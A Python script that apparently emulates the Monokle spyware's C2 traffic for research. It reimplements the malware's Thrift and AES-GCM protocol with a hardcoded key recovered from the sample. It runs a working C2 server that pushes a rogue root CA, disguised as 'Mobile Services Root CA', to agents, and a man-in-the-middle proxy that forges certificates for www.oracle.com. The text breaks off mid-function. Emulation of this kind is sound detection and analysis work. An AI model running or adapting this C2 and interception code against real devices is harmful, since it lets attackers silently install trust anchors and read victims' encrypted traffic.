#!/usr/bin/env python3
"""
Monokle traffic emulator for the socket C2 flow and the later TLS
interception stage enabled by InstallCertificate.

The Monokle part follows the structures recovered from the sample:

* TLSv1.2 over TCP/17185.
* Initial AgentRegistration is length-prefixed and not Monokle-AES wrapped.
* ServerCommand is AES-GCM wrapped as:
    uint16_le(encrypted_len) || iv16 || ciphertext || tag16
* AgentResponse is AES-GCM wrapped as:
    uint32_le(encrypted_len) || 0x01 || iv16 || ciphertext || tag16
"""

from __future__ import annotations

import argparse
import contextlib
import dataclasses
import os
import socket
import ssl
import struct
import sys
import threading
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Optional

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID


MONOKLE_C2_PORT = 17185
DEFAULT_PROXY_PORT = 443
DEFAULT_ORIGIN_PORT = 8443
DEFAULT_ORACLE_HOST = "www.oracle.com"
DEFAULT_AGENT_ID = 10
DEFAULT_PERIOD = 30
DEFAULT_TASK_ID = 7001
DEFAULT_CA_FILENAME = "3c58f906.0"
TRANSPORT_AES_GCM_KEY = bytes.fromhex(
    "2bd83e10e88ecf922314bac8ff1ce7bf603ae511de7aab8744e727ef48a3adfe"
)


class CompactType:
    STOP = 0x00
    TRUE = 0x01
    FALSE = 0x02
    BYTE = 0x03
    I16 = 0x04
    I32 = 0x05
    I64 = 0x06
    DOUBLE = 0x07
    BINARY = 0x08
    LIST = 0x09
    SET = 0x0A
    MAP = 0x0B
    STRUCT = 0x0C


def _zigzag_encode(value: int) -> int:
    return (value << 1) ^ (value >> 63)


def _zigzag_decode(value: int) -> int:
    return (value >> 1) ^ -(value & 1)


def _varint_encode(value: int) -> bytes:
    if value < 0:
        raise ValueError("varint cannot encode negative values")
    out = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            out.append(byte | 0x80)
        else:
            out.append(byte)
            return bytes(out)


class CompactWriter:
    def __init__(self) -> None:
        self.buf = bytearray()
        self._last_field_id = 0
        self._field_stack: list[int] = []

    def bytes(self) -> bytes:
        return bytes(self.buf)

    def write_struct_begin(self) -> None:
        self._field_stack.append(self._last_field_id)
        self._last_field_id = 0

    def write_struct_end(self) -> None:
        self._last_field_id = self._field_stack.pop()

    def write_stop(self) -> None:
        self.buf.append(CompactType.STOP)

    def write_field_begin(self, field_id: int, compact_type: int) -> None:
        delta = field_id - self._last_field_id
        if 0 < delta <= 15:
            self.buf.append((delta << 4) | compact_type)
        else:
            self.buf.append(compact_type)
            self.write_i16(field_id)
        self._last_field_id = field_id

    def write_bool_field(self, field_id: int, value: bool) -> None:
        self.write_field_begin(field_id, CompactType.TRUE if value else CompactType.FALSE)

    def write_i16(self, value: int) -> None:
        self.buf.extend(_varint_encode((value << 1) ^ (value >> 15)))

    def write_i32(self, value: int) -> None:
        self.buf.extend(_varint_encode((value << 1) ^ (value >> 31)))

    def write_i64(self, value: int) -> None:
        self.buf.extend(_varint_encode((value << 1) ^ (value >> 63)))

    def write_binary(self, value: bytes) -> None:
        self.buf.extend(_varint_encode(len(value)))
        self.buf.extend(value)

    def write_string(self, value: str) -> None:
        self.write_binary(value.encode("utf-8"))


class CompactReader:
    def __init__(self, data: bytes) -> None:
        self.data = data
        self.pos = 0
        self._last_field_id = 0
        self._field_stack: list[int] = []

    def read_struct_begin(self) -> None:
        self._field_stack.append(self._last_field_id)
        self._last_field_id = 0

    def read_struct_end(self) -> None:
        self._last_field_id = self._field_stack.pop()

    def read_byte(self) -> int:
        if self.pos >= len(self.data):
            raise EOFError("unexpected end of compact payload")
        value = self.data[self.pos]
        self.pos += 1
        return value

    def read_varint(self) -> int:
        shift = 0
        result = 0
        while True:
            byte = self.read_byte()
            result |= (byte & 0x7F) << shift
            if not (byte & 0x80):
                return result
            shift += 7
            if shift > 70:
                raise ValueError("invalid varint")

    def read_i16(self) -> int:
        return _zigzag_decode(self.read_varint())

    def read_i32(self) -> int:
        return _zigzag_decode(self.read_varint())

    def read_i64(self) -> int:
        return _zigzag_decode(self.read_varint())

    def read_binary(self) -> bytes:
        length = self.read_varint()
        end = self.pos + length
        if end > len(self.data):
            raise EOFError("binary field exceeds payload")
        value = self.data[self.pos:end]
        self.pos = end
        return value

    def read_string(self) -> str:
        return self.read_binary().decode("utf-8", errors="replace")

    def read_field_begin(self) -> tuple[int, int, Optional[bool]]:
        header = self.read_byte()
        if header == CompactType.STOP:
            return 0, CompactType.STOP, None
        compact_type = header & 0x0F
        modifier = (header & 0xF0) >> 4
        if modifier == 0:
            field_id = self.read_i16()
        else:
            field_id = self._last_field_id + modifier
        self._last_field_id = field_id
        bool_value = None
        if compact_type == CompactType.TRUE:
            bool_value = True
        elif compact_type == CompactType.FALSE:
            bool_value = False
        return field_id, compact_type, bool_value

    def skip(self, compact_type: int) -> None:
        if compact_type in (CompactType.TRUE, CompactType.FALSE, CompactType.STOP):
            return
        if compact_type == CompactType.BYTE:
            self.read_byte()
            return
        if compact_type in (CompactType.I16, CompactType.I32, CompactType.I64):
            self.read_varint()
            return
        if compact_type == CompactType.BINARY:
            self.read_binary()
            return
        if compact_type == CompactType.STRUCT:
            self.read_struct_begin()
            while True:
                _, nested_type, _ = self.read_field_begin()
                if nested_type == CompactType.STOP:
                    break
                self.skip(nested_type)
            self.read_struct_end()
            return
        raise NotImplementedError(f"skip for compact type {compact_type} is not implemented")


@dataclasses.dataclass
class AgentRegistrationData:
    device_id: Optional[str] = None
    agent_id: Optional[int] = None
    is_wifi: Optional[bool] = None


@dataclasses.dataclass
class InstallCertificateCommand:
    task_id: Optional[int] = None
    task_type: Optional[int] = None
    timestamp: Optional[int] = None
    filename: Optional[str] = None
    certificate_der: Optional[bytes] = None


@dataclasses.dataclass
class AgentResponseData:
    category: Optional[int] = None
    task_id: Optional[int] = None
    error_code: Optional[int] = None
    error_message: Optional[str] = None


def build_agent_registration_thrift(device_id: str, agent_id: int, is_wifi: bool) -> bytes:
    writer = CompactWriter()
    writer.write_struct_begin()
    writer.write_field_begin(1, CompactType.BINARY)
    writer.write_string(device_id)
    writer.write_field_begin(2, CompactType.I32)
    writer.write_i32(agent_id)
    writer.write_bool_field(3, is_wifi)
    writer.write_stop()
    writer.write_struct_end()
    return writer.bytes()


def build_server_command_install_certificate_thrift(
    filename: str,
    certificate_der: bytes,
    task_id: int,
    timestamp: int,
) -> bytes:
    writer = CompactWriter()
    writer.write_struct_begin()
    writer.write_field_begin(1, CompactType.I32)
    writer.write_i32(0)  # TaskCategory.BaseSystemTask
    writer.write_field_begin(100, CompactType.STRUCT)
    writer.write_struct_begin()
    writer.write_field_begin(1, CompactType.I32)
    writer.write_i32(task_id)
    writer.write_field_begin(2, CompactType.I32)
    writer.write_i32(1019)  # TaskType.InstallCertificate
    writer.write_field_begin(3, CompactType.I64)
    writer.write_i64(timestamp)
    writer.write_field_begin(126, CompactType.STRUCT)
    writer.write_struct_begin()
    writer.write_field_begin(1, CompactType.BINARY)
    writer.write_string(filename)
    writer.write_field_begin(2, CompactType.BINARY)
    writer.write_binary(certificate_der)
    writer.write_stop()
    writer.write_struct_end()
    writer.write_stop()
    writer.write_struct_end()
    writer.write_stop()
    writer.write_struct_end()
    return writer.bytes()


def build_agent_response_success_thrift(task_id: int) -> bytes:
    writer = CompactWriter()
    writer.write_struct_begin()
    writer.write_field_begin(1, CompactType.I32)
    writer.write_i32(0)  # TaskCategory.BaseSystemTask
    writer.write_field_begin(100, CompactType.STRUCT)
    writer.write_struct_begin()
    writer.write_field_begin(1, CompactType.I32)
    writer.write_i32(task_id)
    writer.write_stop()
    writer.write_struct_end()
    writer.write_stop()
    writer.write_struct_end()
    return writer.bytes()


def build_agent_response_error_thrift(task_id: int, code: int, message: Optional[str]) -> bytes:
    writer = CompactWriter()
    writer.write_struct_begin()
    writer.write_field_begin(1, CompactType.I32)
    writer.write_i32(0)
    writer.write_field_begin(100, CompactType.STRUCT)
    writer.write_struct_begin()
    writer.write_field_begin(1, CompactType.I32)
    writer.write_i32(task_id)
    writer.write_field_begin(100, CompactType.STRUCT)
    writer.write_struct_begin()
    writer.write_field_begin(1, CompactType.I32)
    writer.write_i32(code)
    if message is not None:
        writer.write_field_begin(2, CompactType.BINARY)
        writer.write_string(message)
    writer.write_stop()
    writer.write_struct_end()
    writer.write_stop()
    writer.write_struct_end()
    writer.write_stop()
    writer.write_struct_end()
    return writer.bytes()


def parse_agent_registration_payload(payload: bytes) -> AgentRegistrationData:
    if len(payload) < 4:
        raise ValueError("AgentRegistration payload is shorter than uint32 length")
    thrift_len = struct.unpack_from("<I", payload, 0)[0]
    thrift = payload[4 : 4 + thrift_len]
    if len(thrift) != thrift_len:
        raise ValueError("AgentRegistration thrift length is incomplete")
    reader = CompactReader(thrift)
    result = AgentRegistrationData()
    reader.read_struct_begin()
    while True:
        field_id, compact_type, bool_value = reader.read_field_begin()
        if compact_type == CompactType.STOP:
            break
        if field_id == 1 and compact_type == CompactType.BINARY:
            result.device_id = reader.read_string()
        elif field_id == 2 and compact_type == CompactType.I32:
            result.agent_id = reader.read_i32()
        elif field_id == 3 and compact_type in (CompactType.TRUE, CompactType.FALSE):
            result.is_wifi = bool_value
        else:
            reader.skip(compact_type)
    reader.read_struct_end()
    return result


def parse_install_certificate_plaintext(plaintext: bytes) -> InstallCertificateCommand:
    if len(plaintext) < 2:
        raise ValueError("ServerCommand plaintext is shorter than uint16 length")
    thrift_len = struct.unpack_from("<H", plaintext, 0)[0]
    thrift = plaintext[2 : 2 + thrift_len]
    if len(thrift) != thrift_len:
        raise ValueError("ServerCommand thrift length is incomplete")
    return parse_install_certificate_thrift(thrift)


def parse_install_certificate_thrift(thrift: bytes) -> InstallCertificateCommand:
    reader = CompactReader(thrift)
    result = InstallCertificateCommand()
    reader.read_struct_begin()
    while True:
        field_id, compact_type, _ = reader.read_field_begin()
        if compact_type == CompactType.STOP:
            break
        if field_id == 100 and compact_type == CompactType.STRUCT:
            _parse_server_command_base_system(reader, result)
        elif field_id == 1 and compact_type == CompactType.I32:
            reader.read_i32()
        else:
            reader.skip(compact_type)
    reader.read_struct_end()
    return result


def _parse_server_command_base_system(reader: CompactReader, result: InstallCertificateCommand) -> None:
    reader.read_struct_begin()
    while True:
        field_id, compact_type, _ = reader.read_field_begin()
        if compact_type == CompactType.STOP:
            break
        if field_id == 1 and compact_type == CompactType.I32:
            result.task_id = reader.read_i32()
        elif field_id == 2 and compact_type == CompactType.I32:
            result.task_type = reader.read_i32()
        elif field_id == 3 and compact_type == CompactType.I64:
            result.timestamp = reader.read_i64()
        elif field_id == 126 and compact_type == CompactType.STRUCT:
            _parse_install_certificate_body(reader, result)
        else:
            reader.skip(compact_type)
    reader.read_struct_end()


def _parse_install_certificate_body(reader: CompactReader, result: InstallCertificateCommand) -> None:
    reader.read_struct_begin()
    while True:
        field_id, compact_type, _ = reader.read_field_begin()
        if compact_type == CompactType.STOP:
            break
        if field_id == 1 and compact_type == CompactType.BINARY:
            result.filename = reader.read_string()
        elif field_id == 2 and compact_type == CompactType.BINARY:
            result.certificate_der = reader.read_binary()
        else:
            reader.skip(compact_type)
    reader.read_struct_end()


def parse_agent_response_plaintext(plaintext: bytes) -> AgentResponseData:
    if len(plaintext) < 4:
        raise ValueError("AgentResponse plaintext is shorter than uint32 length")
    thrift_len = struct.unpack_from("<I", plaintext, 0)[0]
    thrift = plaintext[4 : 4 + thrift_len]
    if len(thrift) != thrift_len:
        raise ValueError("AgentResponse thrift length is incomplete")
    reader = CompactReader(thrift)
    result = AgentResponseData()
    reader.read_struct_begin()
    while True:
        field_id, compact_type, _ = reader.read_field_begin()
        if compact_type == CompactType.STOP:
            break
        if field_id == 1 and compact_type == CompactType.I32:
            result.category = reader.read_i32()
        elif field_id == 100 and compact_type == CompactType.STRUCT:
            _parse_agent_response_base_system(reader, result)
        else:
            reader.skip(compact_type)
    reader.read_struct_end()
    return result


def _parse_agent_response_base_system(reader: CompactReader, result: AgentResponseData) -> None:
    reader.read_struct_begin()
    while True:
        field_id, compact_type, _ = reader.read_field_begin()
        if compact_type == CompactType.STOP:
            break
        if field_id == 1 and compact_type == CompactType.I32:
            result.task_id = reader.read_i32()
        elif field_id == 100 and compact_type == CompactType.STRUCT:
            _parse_agent_response_error(reader, result)
        else:
            reader.skip(compact_type)
    reader.read_struct_end()


def _parse_agent_response_error(reader: CompactReader, result: AgentResponseData) -> None:
    reader.read_struct_begin()
    while True:
        field_id, compact_type, _ = reader.read_field_begin()
        if compact_type == CompactType.STOP:
            break
        if field_id == 1 and compact_type == CompactType.I32:
            result.error_code = reader.read_i32()
        elif field_id == 2 and compact_type == CompactType.BINARY:
            result.error_message = reader.read_string()
        else:
            reader.skip(compact_type)
    reader.read_struct_end()


def wrap_registration(thrift: bytes) -> bytes:
    return struct.pack("<I", len(thrift)) + thrift


def wrap_server_command_plaintext(thrift: bytes) -> bytes:
    if len(thrift) > 0xFFFF:
        raise ValueError("ServerCommand thrift is too large for uint16 length")
    return struct.pack("<H", len(thrift)) + thrift


def wrap_agent_response_plaintext(thrift: bytes) -> bytes:
    return struct.pack("<I", len(thrift)) + thrift


def encrypt_server_frame(plaintext: bytes, key: bytes, iv: Optional[bytes] = None) -> bytes:
    iv = os.urandom(16) if iv is None else iv
    if len(iv) != 16:
        raise ValueError("server frame IV must be 16 bytes")
    encrypted_len = len(iv) + len(plaintext) + 16
    if encrypted_len > 0xFFFF:
        raise ValueError("server frame is too large for uint16 length")
    aad = struct.pack("<I", encrypted_len)
    ciphertext = AESGCM(key).encrypt(iv, plaintext, aad)
    return struct.pack("<H", encrypted_len) + iv + ciphertext


def decrypt_server_frame(frame: bytes, key: bytes) -> bytes:
    if len(frame) < 2 + 16 + 16:
        raise ValueError("server frame is too short")
    encrypted_len = struct.unpack_from("<H", frame, 0)[0]
    if len(frame) != encrypted_len + 2:
        raise ValueError("server frame length mismatch")
    iv = frame[2:18]
    ciphertext = frame[18:]
    aad = struct.pack("<I", encrypted_len)
    return AESGCM(key).decrypt(iv, ciphertext, aad)


def encrypt_client_frame(plaintext: bytes, key: bytes, iv: Optional[bytes] = None) -> bytes:
    iv = os.urandom(16) if iv is None else iv
    if len(iv) != 16:
        raise ValueError("client frame IV must be 16 bytes")
    encrypted_len = len(iv) + len(plaintext) + 16
    aad = struct.pack("<I", encrypted_len) + b"\x01"
    ciphertext = AESGCM(key).encrypt(iv, plaintext, aad)
    return aad + iv + ciphertext


def decrypt_client_frame(frame: bytes, key: bytes) -> bytes:
    if len(frame) < 4 + 1 + 16 + 16:
        raise ValueError("client frame is too short")
    encrypted_len = struct.unpack_from("<I", frame, 0)[0]
    if frame[4] != 1:
        raise ValueError("client frame marker is not 0x01")
    if len(frame) != encrypted_len + 5:
        raise ValueError("client frame length mismatch")
    aad = frame[:5]
    iv = frame[5:21]
    ciphertext = frame[21:]
    return AESGCM(key).decrypt(iv, ciphertext, aad)


def recv_exact(sock: ssl.SSLSocket | socket.socket, count: int) -> bytes:
    chunks = bytearray()
    while len(chunks) < count:
        part = sock.recv(count - len(chunks))
        if not part:
            raise EOFError("socket closed while reading")
        chunks.extend(part)
    return bytes(chunks)


def recv_until_headers(sock: ssl.SSLSocket, limit: int = 65536) -> bytes:
    data = bytearray()
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
        if len(data) > limit:
            raise ValueError("HTTP request headers are too large")
    return bytes(data)


def read_tls_response(sock: ssl.SSLSocket, limit: int = 1024 * 1024) -> bytes:
    chunks = bytearray()
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        chunks.extend(chunk)
        if len(chunks) > limit:
            raise ValueError("HTTP response is too large")
    return bytes(chunks)


def close_tls_gracefully(sock: ssl.SSLSocket, timeout: float = 2.0) -> bool:
    """Exchange TLS close_notify before closing the underlying TCP socket."""
    try:
        sock.settimeout(timeout)
        raw_sock = sock.unwrap()
    except (OSError, ssl.SSLError):
        sock.close()
        return False
    raw_sock.close()
    return True


def make_server_ssl_context(cert_path: Path, key_path: Path) -> ssl.SSLContext:
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    context.load_cert_chain(certfile=str(cert_path), keyfile=str(key_path))
    return context


def make_client_ssl_context(
    *,
    cafile: Optional[Path] = None,
    verify: bool = True,
    keylog_file: Optional[Path] = None,
) -> ssl.SSLContext:
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    if verify:
        context.check_hostname = True
        context.verify_mode = ssl.CERT_REQUIRED
        if cafile is not None:
            context.load_verify_locations(cafile=str(cafile))
        else:
            context.load_default_certs()
    else:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    if keylog_file is not None:
        if not hasattr(context, "keylog_filename"):
            raise RuntimeError("Python ssl does not support TLS key logging")
        context.keylog_filename = str(keylog_file)
    return context


def write_private_key(path: Path, key: rsa.RSAPrivateKey) -> None:
    path.write_bytes(
        key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        )
    )


def write_cert(path_pem: Path, path_der: Path, cert: x509.Certificate) -> None:
    path_pem.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    path_der.write_bytes(cert.public_bytes(serialization.Encoding.DER))


def _certificate_dns_names(cert: x509.Certificate) -> set[str]:
    try:
        extension = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
    except x509.ExtensionNotFound:
        return set()
    return set(extension.value.get_values_for_type(x509.DNSName))


def _certificate_matches_key(cert_path: Path, key_path: Path) -> bool:
    try:
        cert = x509.load_pem_x509_certificate(cert_path.read_bytes())
        key = serialization.load_pem_private_key(key_path.read_bytes(), password=None)
        return cert.public_key().public_numbers() == key.public_key().public_numbers()
    except (OSError, ValueError, TypeError):
        return False


def cert_material_is_current(paths: dict[str, Path], oracle_host: str) -> bool:
    required = (
        "installed_ca_key",
        "installed_ca_pem",
        "installed_ca_der",
        "c2_key",
        "c2_cert",
        "c2_der",
        "proxy_key",
        "proxy_cert",
        "proxy_der",
        "origin_key",
        "origin_cert",
        "origin_der",
    )
    if not all(paths[name].is_file() for name in required):
        return False

    if not all(
        _certificate_matches_key(paths[cert_name], paths[key_name])
        for cert_name, key_name in (
            ("installed_ca_pem", "installed_ca_key"),
            ("c2_cert", "c2_key"),
            ("proxy_cert", "proxy_key"),
            ("origin_cert", "origin_key"),
        )
    ):
        return False

    try:
        ca_cert = x509.load_pem_x509_certificate(paths["installed_ca_pem"].read_bytes())
        c2_cert = x509.load_pem_x509_certificate(paths["c2_cert"].read_bytes())
        proxy_cert = x509.load_pem_x509_certificate(paths["proxy_cert"].read_bytes())
        origin_cert = x509.load_pem_x509_certificate(paths["origin_cert"].read_bytes())
        ca_constraints = ca_cert.extensions.get_extension_for_class(x509.BasicConstraints).value
        pem_der_pairs = (
            (ca_cert, "installed_ca_der"),
            (c2_cert, "c2_der"),
            (proxy_cert, "proxy_der"),
            (origin_cert, "origin_der"),
        )
        return (
            ca_constraints.ca
            and proxy_cert.issuer == ca_cert.subject
            and _certificate_dns_names(c2_cert) == {"TEST"}
            and _certificate_dns_names(proxy_cert) == {oracle_host}
            and _certificate_dns_names(origin_cert) == {oracle_host}
            and all(
                cert.public_bytes(serialization.Encoding.DER) == paths[der_name].read_bytes()
                for cert, der_name in pem_der_pairs
            )
        )
    except (OSError, ValueError, x509.ExtensionNotFound):
        return False


def name(common_name: str, organization: Optional[str] = None) -> x509.Name:
    attrs = [x509.NameAttribute(NameOID.COMMON_NAME, common_name)]
    if organization:
        attrs.append(x509.NameAttribute(NameOID.ORGANIZATION_NAME, organization))
    return x509.Name(attrs)


def new_key() -> rsa.RSAPrivateKey:
    return rsa.generate_private_key(public_exponent=65537, key_size=2048)


def build_ca_cert(key: rsa.RSAPrivateKey) -> x509.Certificate:
    now = datetime.now(timezone.utc)
    subject = name("Mobile Services Root CA", "System Update")
    return (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(subject)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - timedelta(days=1))
        .not_valid_after(now + timedelta(days=3650))
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True,
                key_cert_sign=True,
                key_encipherment=False,
                content_commitment=False,
                data_encipherment=False,
                key_agreement=False,
                crl_sign=True,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        )
        .sign(private_key=key, algorithm=hashes.SHA256())
    )


def build_self_signed_server_cert(key: rsa.RSAPrivateKey, common_name: str) -> x509.Certificate:
    now = datetime.now(timezone.utc)
    subject = name(common_name, "X")
    builder = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(subject)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - timedelta(days=1))
        .not_valid_after(now + timedelta(days=3650))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(x509.SubjectAlternativeName([x509.DNSName(common_name)]), critical=False)
        .add_extension(
            x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]),
            critical=False,
        )
    )
    return builder.sign(private_key=key, algorithm=hashes.SHA256())


def build_leaf_cert(
    key: rsa.RSAPrivateKey,
    ca_key: rsa.RSAPrivateKey,
    ca_cert: x509.Certificate,
    dns_name: str,
) -> x509.Certificate:
    now = datetime.now(timezone.utc)
    return (
        x509.CertificateBuilder()
        .subject_name(name(dns_name, "Oracle"))
        .issuer_name(ca_cert.subject)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - timedelta(days=1))
        .not_valid_after(now + timedelta(days=825))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(x509.SubjectAlternativeName([x509.DNSName(dns_name)]), critical=False)
        .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
        .sign(private_key=ca_key, algorithm=hashes.SHA256())
    )


def ensure_cert_material(cert_dir: Path, oracle_host: str, regen: bool = False) -> dict[str, Path]:
    cert_dir.mkdir(parents=True, exist_ok=True)
    paths = {
        "installed_ca_key": cert_dir / "installed_ca.key.pem",
        "installed_ca_pem": cert_dir / "installed_ca.pem",
        "installed_ca_der": cert_dir / "installed_ca.der",
        "c2_key": cert_dir / "c2_tls.key.pem",
        "c2_cert": cert_dir / "c2_tls.cert.pem",
        "c2_der": cert_dir / "c2_tls.cert.der",
        "proxy_key": cert_dir / "proxy_leaf.key.pem",
        "proxy_cert": cert_dir / "proxy_leaf.cert.pem",
        "proxy_der": cert_dir / "proxy_leaf.cert.der",
        "origin_key": cert_dir / "origin_tls.key.pem",
        "origin_cert": cert_dir / "origin_tls.cert.pem",
        "origin_der": cert_dir / "origin_tls.cert.der",
        "received_ca_pem": cert_dir / "received_installed_ca.pem",
        "received_ca_der": cert_dir / "received_installed_ca.der",
    }
    if not regen and cert_material_is_current(paths, oracle_host):
        return paths

    ca_key = new_key()
    ca_cert = build_ca_cert(ca_key)
    write_private_key(paths["installed_ca_key"], ca_key)
    write_cert(paths["installed_ca_pem"], paths["installed_ca_der"], ca_cert)

    c2_key = new_key()
    c2_cert = build_self_signed_server_cert(c2_key, "TEST")
    write_private_key(paths["c2_key"], c2_key)
    write_cert(paths["c2_cert"], paths["c2_der"], c2_cert)

    proxy_key = new_key()
    proxy_cert = build_leaf_cert(proxy_key, ca_key, ca_cert, oracle_host)
    write_private_key(paths["proxy_key"], proxy_key)
    write_cert(paths["proxy_cert"], paths["proxy_der"], proxy_cert)

    origin_key = new_key()
    origin_cert = build_self_signed_server_cert(origin_key, oracle_host)
    write_private_key(paths["origin_key"], origin_key)
    write_cert(paths["origin_cert"], paths["origin_der"], origin_cert)
    return paths


def log(component: str, message: str) -> None:
    print(f"[{component}] {message}", flush=True)


def listen_socket(host: str, port: int) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(20)
    sock.settimeout(0.5)
    return sock


def c2_handle_client(raw_sock: socket.socket, context: ssl.SSLContext, args: argparse.Namespace) -> None:
    with raw_sock:
        try:
            with context.wrap_socket(raw_sock, server_side=True) as tls_sock:
                header = recv_exact(tls_sock, 4)
                reg_len = struct.unpack("<I", header)[0]
                registration_payload = header + recv_exact(tls_sock, reg_len)
                registration = parse_agent_registration_payload(registration_payload)
                log(
                    "c2",
                    f"AgentRegistration deviceId={registration.device_id!r} "
                    f"agentId={registration.agent_id} isWifi={registration.is_wifi}",
                )

                ca_der = Path(args.cert_dir, "installed_ca.der").read_bytes()
                command_thrift = build_server_command_install_certificate_thrift(
                    args.ca_filename,
                    ca_der,
                    args.task_id,
                    int(time.time()),
                )
                plaintext = wrap_server_command_plaintext(command_thrift)
                frame = encrypt_server_frame(plaintext, TRANSPORT_AES_GCM_KEY)
                tls_sock.sendall(frame)
                log(
                    "c2",
                    f"sent InstallCertificate taskId={args.task_id} "
                    f"thrift={len(command_thrift)} encrypted={len(frame)}",
                )

                response_header = recv_exact(tls_sock, 5)
                encrypted_len = struct.unpack("<I", response_header[:4])[0]
                response_frame = response_header + recv_exact(tls_sock, encrypted_len)
                response_plaintext = decrypt_client_frame(response_frame, TRANSPORT_AES_GCM_KEY)
                response = parse_agent_response_plaintext(response_plaintext)
                log(
                    "c2",
                    f"AgentResponse taskId={response.task_id} "
                    f"errorCode={response.error_code} errorMessage={response.error_message!r}",
                )
        except Exception as exc:
            log("c2", f"client error: {exc}")


def run_c2_server(args: argparse.Namespace, stop: threading.Event) -> None:
    paths = ensure_cert_material(Path(args.cert_dir), args.oracle_host, args.regen_certs)
    context = make_server_ssl_context(paths["c2_cert"], paths["c2_key"])
    with listen_socket(args.c2_bind, args.c2_port) as server:
        log("c2", f"listening on {args.c2_bind}:{args.c2_port} TLSv1.2")
        while not stop.is_set():
            try:
                client, addr = server.accept()
            except socket.timeout:
                continue
            log("c2", f"accepted {addr[0]}:{addr[1]}")
            thread = threading.Thread(target=c2_handle_client, args=(client, context, args), daemon=True)
            thread.start()


def origin_handle_client(raw_sock: socket.socket, context: ssl.SSLContext, oracle_host: str) -> None:
    with raw_sock:
        try:
            with context.wrap_socket(raw_sock, server_side=True) as tls_sock:
                request = recv_until_headers(tls_sock)
                first_line = request.split(b"\r\n", 1)[0].decode("ascii", errors="replace")
                log("origin", f"request {first_line}")
                body = (
                    b'{"service":"oracle-cloud-identity","status":"ok",'
                    b'"source":"simulated-origin"}\n'
                )
                response = (
                    b"HTTP/1.1 200 OK\r\n"
                    b"Content-Type: application/json\r\n"
                    + f"Content-Length: {len(body)}\r\n".encode("ascii")
                    + b"Connection: close\r\n"
                    + f"Server: {oracle_host}\r\n".encode("ascii")
                    + b"\r\n"
                    + body
                )
                tls_sock.sendall(response)
                close_tls_gracefully(tls_sock)
        except Exception as exc:
            log("origin", f"client error: {exc}")


def run_origin_server(args: argparse.Namespace, stop: threading.Event) -> None:
    paths = ensure_cert_material(Path(args.cert_dir), args.oracle_host, args.regen_certs)
    context = make_server_ssl_context(paths["origin_cert"], paths["origin_key"])
    with listen_socket(args.origin_bind, args.origin_port) as server:
        log("origin", f"listening on {args.origin_bind}:{args.origin_port} TLSv1.2")
        while not stop.is_set():
            try:
                client, addr = server.accept()
            except socket.timeout:
                continue
            log("origin", f"accepted {addr[0]}:{addr[1]}")
            thread = threading.Thread(
                target=origin_handle_client,
                args=(client, context, args.oracle_host),
                daemon=True,
            )
            thread.start()


def proxy_handle_client(raw_sock: socket.socket, context: ssl.SSLContext, args: argparse.Namespace) -> None:
    with raw_sock:
        try:
            with context.wrap_socket(raw_sock, server_side=True) as client_tls:
                request = recv_until_headers(client_tls)
                first_line = request.split(b"\r\n", 1)[0].decode("ascii", errors="replace")
                log("proxy", f"victim request {first_line}")

                origin_context = make_client_ssl_context(
                    verify=False,
                    keylog_file=Path(args.keylog_file) if args.keylog_file else None,
                )
                with socket.create_connection((args.origin_connect_host, args.origin_port), timeout=10) as upstream_raw:
                    with origin_context.wrap_socket(upstream_raw, server_hostname=args.oracle_host) as upstream_tls:
                        upstream_tls.sendall(request)
                        response = read_tls_response(upstream_tls)
                        close_tls_gracefully(upstream_tls)
                client_tls.sendall(response)
                log("proxy", f"relayed {len(response)} bytes from origin")
                close_tls_gracefully(client_tls)
        except Exception as exc:
            log("proxy", f"client error: {exc}")


def run_proxy_server(args: argparse.Namespace, stop: threading.Event) -> None:
    paths = ensure_cert_material(Path(args.cert_dir), args.oracle_host, args.regen_certs)
    context = make_server_ssl_context(paths["proxy_cert"], paths["proxy_key"])
    with listen_socket(args.proxy_bind, args.proxy_port) as server:
        log("proxy", f"listening on {args.proxy_bind}:{args.proxy_port} TLSv1.2 for {args.oracle_host}")
        while not stop.is_set():
            try:
                client, addr = server.accept()
            except socket.timeout:
                continue
            log("proxy", f"accepted {addr[0]}:{addr[1]}")
            thread = threading.Thread(target=proxy_handle_client, args=(client, context, args), daemon=True)
            thread.start()


def client_c2_exchange(args: argparse.Namespace) -> Optional[InstallCertificateCommand]:
    context = make_client_ssl_context(
        verify=False,
        keylog_file=Path(args.keylog_file) if args.keylog_file else None,
    )
